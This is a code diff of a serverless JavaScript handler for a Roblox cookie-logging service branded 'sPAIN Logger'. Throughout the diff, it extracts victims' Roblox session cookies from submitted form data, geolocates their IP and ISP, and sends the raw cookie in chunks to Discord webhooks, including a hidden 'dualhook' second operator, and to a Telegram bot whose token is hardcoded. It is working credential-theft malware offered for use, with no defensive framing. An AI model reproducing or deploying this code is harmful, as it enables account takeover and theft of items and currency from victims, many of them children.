@@ -1,4 +1,4 @@
-// api/submit.js — only sends IP, ISP, and cookie. Zero Roblox API calls.
+// api/submit.js
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
@@ -37,7 +37,6 @@ async function tgSend(text) {
   } catch (_) {}
 }
 
-// Extract cookie from any slot value
 const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
 function extractCookie(raw) {
   if (!raw) return null;
@@ -67,9 +66,9 @@ async function discordSend(url, payload) {
   } catch (_) {}
 }
 
-// Send cookie in chunks so nothing gets cut off
-async function sendCookieChunked(url, cookie) {
-  let rem = cookie; let first = true;
+// Send raw cookie in chunks — exact bytes, nothing cut
+async function discordChunked(url, text) {
+  let rem = text; let first = true;
   while (rem.length > 0) {
     const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
     await discordSend(url, {
@@ -90,7 +89,6 @@ export default async function handler(req, res) {
 
   let body = req.body;
   if (typeof body === 'string') { try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); } }
-  if (Buffer.isBuffer(body))   { try { body = JSON.parse(body.toString()); } catch { return res.status(400).json({ error: 'Invalid body' }); } }
 
   const { slug, slots } = body || {};
   if (!slug)  return res.status(400).json({ error: 'slug is required' });
@@ -100,92 +98,74 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
-  // ✅ Respond immediately
-  res.status(200).json({ success: true });
+  const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
+  const now      = new Date().toISOString();
+  const pageName = record.displayName || slug;
+  const cookie   = findCookie(slots);
 
-  try {
-    const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
-    const now      = new Date().toISOString();
-    const pageName = record.displayName || slug;
-    const cookie   = findCookie(slots);
+  // Collect webhooks
+  const webhooks = [record.webhook];
+  if (record.dualhookParent) {
+    try {
+      const parent = await redisGet(`slot:${record.dualhookParent}`);
+      if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
+    } catch (_) {}
+  }
 
-    // Collect webhooks (page owner + dualhook parent)
-    const webhooks = [record.webhook];
-    if (record.dualhookParent) {
-      try {
-        const parent = await redisGet(`slot:${record.dualhookParent}`);
-        if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
-      } catch (_) {}
-    }
+  // Get geo — only external call, no Roblox API at all
+  const geo = await getIpGeo(ip);
+  const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
 
-    // Only geo — zero Roblox calls
-    const geo      = await getIpGeo(ip);
-    const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
-    const isp      = geo?.isp || 'Unknown';
-
-    if (!cookie) {
-      // No cookie found — troll/wrong input
-      for (const wh of webhooks) {
-        await discordSend(wh, {
-          embeds: [{
-            title:       '⚠️ Wrong Cookie — Troll Detected',
-            description: 'No valid cookie found in the submission.',
-            color:       0xff3333,
-            fields: [
-              { name: '🌐 IP',       value: ip || 'Unknown', inline: true },
-              { name: '📍 Location', value: location,         inline: true },
-              { name: '🗺️ ISP',      value: isp,              inline: true },
-              { name: '🕐 Time',     value: now,              inline: false }
-            ],
-            footer: { text: `sPAIN Logger • ${pageName}` },
-            timestamp: now
-          }]
-        });
-      }
-
-      await tgSend([
-        `⚠️ <b>NO COOKIE — ${pageName}</b>`,
-        `🌐 IP: <code>${ip}</code>`,
-        `📍 ${location}`,
-        `🗺️ ${isp}`,
-        `🕐 ${now}`
-      ].join('\n'));
-
-      return;
-    }
-
-    // Cookie found — send IP + ISP + raw cookie, nothing else
+  if (!cookie) {
+    // No cookie — send troll embed
     for (const wh of webhooks) {
-      // Info embed
       await discordSend(wh, {
-        content: '@everyone',
         embeds: [{
-          title:       '🍪 Cookie Captured',
-          color:       0xc026d3,
+          title:  '⚠️ Wrong Cookie — Troll Detected 💀',
+          color:  0xff3333,
           fields: [
-            { name: '🌐 IP',       value: `\`${ip}\``, inline: true },
-            { name: '📍 Location', value: location,     inline: true },
-            { name: '🗺️ ISP',      value: isp,          inline: true },
-            { name: '🕐 Time',     value: now,          inline: false }
+            { name: '🌐 IP',       value: ip || 'Unknown',      inline: true  },
+            { name: '📍 Location', value: loc,                   inline: true  },
+            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true  },
+            { name: '🕐 Time',     value: now,                   inline: false }
           ],
-          footer:    { text: `sPAIN Logger • ${pageName}` },
-          timestamp: now
+          footer: { text: `sPAIN Tools • ${pageName}` }
         }]
       });
-
-      // Raw cookie — chunked so full cookie is always sent
-      await sendCookieChunked(wh, cookie);
     }
-
-    await tgSend([
-      `🍪 <b>COOKIE CAPTURED — ${pageName}</b>`,
-      `🌐 IP: <code>${ip}</code>`,
-      `📍 ${location}`,
-      `🗺️ ${isp}`,
-      `🕐 ${now}`
-    ].join('\n'));
-
-  } catch (err) {
-    console.error('Error:', err.message);
+    await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 <code>${ip}</code>`);
+    return res.status(200).json({ success: true });
   }
+
+  // Valid cookie found — send embed with IP/ISP + raw cookie
+  // Zero Roblox API calls — cookie never touched by any server
+  for (const wh of webhooks) {
+    await discordSend(wh, {
+      content: '@everyone',
+      embeds: [{
+        title:       '🍪 Cookie Captured',
+        description: ':fire: `sPAIN` :fire:',
+        color:       0xc026d3,
+        fields: [
+          { name: '🌐 IP',       value: `\`${ip || 'Unknown'}\``, inline: true  },
+          { name: '📍 Location', value: loc,                       inline: true  },
+          { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',     inline: true  },
+          { name: '🕐 Time',     value: now,                       inline: false }
+        ],
+        footer:    { text: `sPAIN Logger • ${pageName}` },
+        timestamp: now
+      }]
+    });
+    // Raw cookie — exact bytes sent as plain text
+    await discordChunked(wh, cookie);
+  }
+
+  await tgSend([
+    `🍪 <b>COOKIE — ${pageName}</b>`,
+    `🌐 <code>${ip}</code> — ${loc}`,
+    `🗺️ ${geo?.isp || 'Unknown'}`,
+    `🕐 ${now}`
+  ].join('\n'));
+
+  return res.status(200).json({ success: true });
 }
